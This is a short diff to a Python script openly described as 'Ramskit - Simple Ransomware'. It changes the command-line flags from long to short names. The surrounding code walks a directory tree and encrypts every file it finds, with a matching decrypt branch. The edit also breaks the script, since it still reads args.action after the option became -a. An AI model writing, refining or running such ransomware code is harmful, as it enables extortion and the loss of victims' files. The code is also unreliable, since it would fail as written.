@@ -42,9 +42,9 @@ class Ramskit:
 
 if __name__ =='__main__':
     parser = argparse.ArgumentParser(description="Ramskit - Simple Ransomware")
-    parser.add_argument('--action', required=True)
-    parser.add_argument('--keyfile')
-    parser.add_argument('--path', required=True)
+    parser.add_argument('-a', required=True)
+    parser.add_argument('-k')
+    parser.add_argument('-p', required=True)
     args = parser.parse_args()
 
     action = args.action.lower()
@@ -59,7 +59,7 @@ if __name__ =='__main__':
             for f in files:
                 items.append(os.path.join(root, f))
         ramskit.encrypt_file(items)
-    
+
     elif action == 'decrypt':
         items = []
         for root, _, files in os.walk(path):
